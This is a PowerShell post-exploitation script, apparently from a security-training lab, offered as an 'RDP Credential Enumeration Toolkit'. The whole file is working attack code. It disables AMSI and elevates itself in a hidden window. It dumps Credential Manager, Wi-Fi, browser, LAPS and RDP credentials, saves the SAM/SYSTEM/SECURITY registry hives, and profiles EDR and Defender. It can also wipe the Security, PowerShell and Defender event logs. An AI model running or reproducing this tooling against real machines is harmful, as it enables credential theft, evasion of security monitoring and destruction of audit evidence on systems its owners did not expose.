[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

function Invoke-PrivilegeEscalation {
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        try {
            Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -ErrorAction SilentlyContinue
            Exit
        } catch {}
    } else {
        $host.UI.RawUI.WindowTitle = "Credential Enumeration - Administrator RDP Session"
    }
}

function Clear-CommonLogs {
    $logsToClear = @("Security", "System", "Application", "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-Windows Defender/Operational")
    foreach ($log in $logsToClear) {
        try {
            if ($log -like "Microsoft-*") {
                wevtutil cl $log 2>$null
            } else {
                Clear-EventLog -LogName $log -ErrorAction SilentlyContinue
            }
        } catch {}
    }
}

function Func-CredManager {
    try {
        [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
        $vault = New-Object Windows.Security.Credentials.PasswordVault
        $creds = $vault.RetrieveAll()
        $credList = @()
        $creds | ForEach-Object {
            try { $_.RetrievePassword() } catch {}
            if ($_.Password) {
                $credList += [PSCustomObject]@{
                    Resource = $_.Resource
                    UserName = $_.UserName
                    Password = $_.Password
                }
            }
        }
        if ($credList.Count -gt 0) {
            $credList | ConvertTo-Json -Depth 4 | Out-File "$outputDir\credman.json" -Encoding utf8
            $credList | Export-Csv "$outputDir\credman.csv" -NoTypeInformation -Encoding utf8
        }
    } catch {}
}

function Func-CmdKey {
    $out = cmdkey /list
    $parsed = @()
    $current = @{}
    foreach ($line in $out) {
        if ($line -match "^Target:\s*(.+)$") { $current.Target = $matches[1].Trim() }
        if ($line -match "^Type:\s*(.+)$")   { $current.Type   = $matches[1].Trim() }
        if ($line -match "^User:\s*(.+)$")   { $current.User   = $matches[1].Trim() }
        if ($line.Trim() -eq "") {
            if ($current.Count -gt 0 -and $current.User) {
                $parsed += [PSCustomObject]$current
            }
            $current = @{}
        }
    }
    if ($parsed.Count -gt 0) {
        $parsed | ConvertTo-Json -Depth 4 | Out-File "$outputDir\cmdkey.json" -Encoding utf8
    }
}

function Func-WiFi {
    $wifiList = @()
    (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
        $name = $_.Matches.Groups[1].Value.Trim()
        $key = (netsh wlan show profile name="$name" key=clear) | Select-String "Key Content\W+\:(.+)$"
        if ($key) {
            $wifiList += [PSCustomObject]@{
                Profile  = $name
                Password = $key.Matches.Groups[1].Value.Trim()
            }
        }
    }
    if ($wifiList.Count -gt 0) {
        $wifiList | ConvertTo-Json -Depth 4 | Out-File "$outputDir\wifi.json" -Encoding utf8
    }
}

function Func-RDP {
    $blobs = Get-ChildItem -Path "$env:APPDATA\Microsoft\Credentials","$env:LOCALAPPDATA\Microsoft\Credentials" -Recurse -File -ErrorAction SilentlyContinue |
        Select FullName, Length, LastWriteTime, @{Name="Computer";Expression={$env:COMPUTERNAME}}
    if ($blobs) {
        $blobs | ConvertTo-Json -Depth 4 | Out-File "$outputDir\rdp_cred_blobs.json" -Encoding utf8
    }
    reg query "HKCU\Software\Microsoft\Terminal Server Client\Default" /s 2>$null | Out-File "$outputDir\rdp_default.reg.txt" -Encoding ascii
    reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s 2>$null | Out-File "$outputDir\rdp_servers.reg.txt" -Encoding ascii
}

function Func-Browsers {
    $paths = @(
        @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"},
        @{Name="Edge";   Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"},
        @{Name="Firefox";Path=(Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue | Select -Last 1 -Expand FullName) + "\logins.json"}
    )
    foreach ($p in $paths) {
        if (Test-Path $p.Path) {
            $dest = "$outputDir\browser_$($p.Name.ToLower())"
            if ($p.Name -eq "Firefox") {
                Copy-Item $p.Path "$dest.json" -Force
            } else {
                Copy-Item $p.Path "$dest.sqlite" -Force
            }
        }
    }
}

function Func-LAPS {
    try {
        Get-ADComputer $env:COMPUTERNAME -Properties ms-Mcs-AdmPwd -ErrorAction Stop |
            Select-Object Name, ms-Mcs-AdmPwd |
            ConvertTo-Json -Depth 3 |
            Out-File "$outputDir\laps.json" -Encoding utf8
    } catch {}
}

function Func-Unattended {
    Get-ChildItem -Path "C:\","C:\Windows\Panther","C:\Windows\System32\sysprep" -Recurse -Include *.xml,*.txt,unattend*,sysprep* -ErrorAction SilentlyContinue |
        Where-Object { $_.Length -lt 1MB -and $_.Length -gt 0 } |
        ForEach-Object {
            Copy-Item $_.FullName "$outputDir\unattended_$($_.Name)" -Force
        }
}

function Func-Hives {
    reg save HKLM\SAM "$outputDir\sam.hive" 2>$null
    reg save HKLM\SYSTEM "$outputDir\system.hive" 2>$null
    reg save HKLM\SECURITY "$outputDir\security.hive" 2>$null
}

function Func-Dpapi {
    Get-ChildItem -Path "$env:APPDATA\Microsoft\Protect", "$env:LOCALAPPDATA\Microsoft\Protect" -Recurse -File -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match '^[0-9a-f]{40}$' } |
        Select FullName, Length, LastWriteTime |
        ConvertTo-Json -Depth 4 |
        Out-File "$outputDir\dpapi_masterkeys.json" -Encoding utf8
}

function Func-ScheduledTasksCreds {
    Get-ScheduledTask | Where-Object { $_.Principal.UserId -or $_.Principal.LogonType -eq "Password" } |
        Select TaskName, TaskPath, Principal, @{Name="User";Expression={$_.Principal.UserId}}, @{Name="LogonType";Expression={$_.Principal.LogonType}} |
        ConvertTo-Json -Depth 4 |
        Out-File "$outputDir\scheduled_tasks_creds.json" -Encoding utf8
}

function Func-CheckAV {
    Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue |
        Select-Object displayName, productState, timestamp |
        ConvertTo-Json -Depth 3 |
        Out-File "$outputDir\installed_antivirus.json" -Encoding utf8
}

function Func-EDRProcesses {
    $edrPatterns = @("*crowdstrike*","*csagent*","*falcon*","*csfalcon*","*sentinelone*","*sentinel*","*sed*","*sophos*","*carbonblack*","*cbdefense*","*confer*","*cortex*","*xdr*","*trap*","*defender*","*msmpeng*","*sense*","*wdnisdrv*","*elastic*","*endpoint*","*harfanglab*","*morphisec*","*cylance*","*fireeye*","*tanium*")
    $processes = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -and ($edrPatterns | Where-Object { $_.Path -like $_ }) }
    $services = Get-Service -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName -match ($edrPatterns -join "|") -or $_.Name -match ($edrPatterns -join "|") }
    $result = [PSCustomObject]@{
        SuspiciousProcesses = $processes | Select Id,Name,Path,Company,StartTime
        SuspiciousServices  = $services  | Select Name,DisplayName,Status,StartType
    }
    $result | ConvertTo-Json -Depth 5 | Out-File "$outputDir\edr_av_processes_services.json" -Encoding utf8
}

function Func-EDRDrivers {
    $drivers = Get-WmiObject Win32_SystemDriver |
        Where-Object { $_.DisplayName -match "carbonblack|crowdstrike|sentinel|falcon|elastic|harfang|cortex|xdr|tanium|morphisec|cylance|fireeye|sophos" } |
        Select Name, DisplayName, State, PathName
    if ($drivers) {
        $drivers | ConvertTo-Json -Depth 3 | Out-File "$outputDir\edr_drivers.json" -Encoding utf8
    }
}

function Func-DefenderStatus {
    $defender = @{}
    try {
        $defender["RealTimeProtection"] = (Get-MpPreference).DisableRealtimeMonitoring -eq $false
        $defender["BehaviorMonitoring"] = -not (Get-MpPreference).DisableBehaviorMonitoring
        $defender["IOAVProtection"]     = -not (Get-MpPreference).DisableIOAVProtection
        $defender["ScriptScanning"]     = -not (Get-MpPreference).DisableScriptScanning
        $defender["ControlledFolderAccess"] = (Get-MpPreference).EnableControlledFolderAccess -ne 0
        $defender["TamperProtection"]   = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -ErrorAction SilentlyContinue
    } catch {}
    try {
        $defender["LastQuickScan"] = (Get-MpComputerStatus).LastQuickScanTime
        $defender["LastFullScan"]  = (Get-MpComputerStatus).LastFullScanTime
        $defender["AntivirusEnabled"] = (Get-MpComputerStatus).AntivirusEnabled
        $defender["AMServiceEnabled"] = (Get-MpComputerStatus).AMServiceEnabled
    } catch {}
    $defender | ConvertTo-Json -Depth 4 | Out-File "$outputDir\defender_status.json" -Encoding utf8
}

function Func-SecurityProcesses {
    Get-Process -ErrorAction SilentlyContinue |
        Where-Object { $_.Path -match "msmpeng|MsMpEng|Sense|WdNisDrv|csagent|falcon|sentinel|Cortex|XDR|S1Agent|Elastic|Harfang|Morphisec|Cylance|FireEye|Tanium|Sophos" } |
        Select Id,Name,Path,Company,StartTime,SessionId |
        ConvertTo-Json -Depth 4 |
        Out-File "$outputDir\security_related_processes.json" -Encoding utf8
}

function Show-Menu {
    Clear-Host
    Write-Host @"
╔══════════════════════════════════════════════════════╗
║     RDP Credential Enumeration Toolkit - 2026        ║
║             Pwned Labs | @maverickx64                ║
╚══════════════════════════════════════════════════════╝
"@ -ForegroundColor Cyan

    Write-Host " 1. Windows Credential Manager"
    Write-Host " 2. cmdkey / saved network credentials"
    Write-Host " 3. WiFi Profiles + Passwords"
    Write-Host " 4. RDP saved credentials & servers"
    Write-Host " 5. Browser password files (Chrome/Edge/Firefox)"
    Write-Host " 6. LAPS local admin password (if domain)"
    Write-Host " 7. Unattended/Sysprep files"
    Write-Host " 8. SAM / SYSTEM / SECURITY hives"
    Write-Host " 9. DPAPI master key locations"
    Write-Host "10. Scheduled Tasks with stored credentials"
    Write-Host ""
    Write-Host "Security / EDR detection:"
    Write-Host "11. Check installed AV / Security Products"
    Write-Host "12. Quick EDR / AV process & service detection"
    Write-Host "13. Most common EDR driver & service names"
    Write-Host "14. Check Defender status + real-time protection"
    Write-Host "15. List security-related running processes"
    Write-Host ""
    Write-Host " C. Clear common event logs"
    Write-Host " 0. Exit"
    Write-Host ""
    $choice = Read-Host "Enter choice"
    return $choice
}

$outputDir = "$env:USERPROFILE\Desktop\Loot_$(Get-Date -Format 'yyyy-MM-dd_HHmm')"
New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
Write-Host "[+] Output directory: $outputDir`n" -ForegroundColor Green

Invoke-PrivilegeEscalation

do {
    $choice = Show-Menu
    switch ($choice) {
        '1'  { Func-CredManager }
        '2'  { Func-CmdKey }
        '3'  { Func-WiFi }
        '4'  { Func-RDP }
        '5'  { Func-Browsers }
        '6'  { Func-LAPS }
        '7'  { Func-Unattended }
        '8'  { Func-Hives }
        '9'  { Func-Dpapi }
        '10' { Func-ScheduledTasksCreds }
        '11' { Func-CheckAV }
        '12' { Func-EDRProcesses }
        '13' { Func-EDRDrivers }
        '14' { Func-DefenderStatus }
        '15' { Func-SecurityProcesses }
        'C'  { Clear-CommonLogs; Write-Host "[+] Common logs cleared" -ForegroundColor Green }
        '0'  { break }
    }
    if ($choice -ne '0') {
        Write-Host "`nPress any key to continue..." -ForegroundColor Gray
        $null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    }
} while ($choice -ne '0')

Write-Host @"
Finished.
Results saved to: $outputDir

Pwned Labs | @maverickx64
"@ -ForegroundColor Cyan
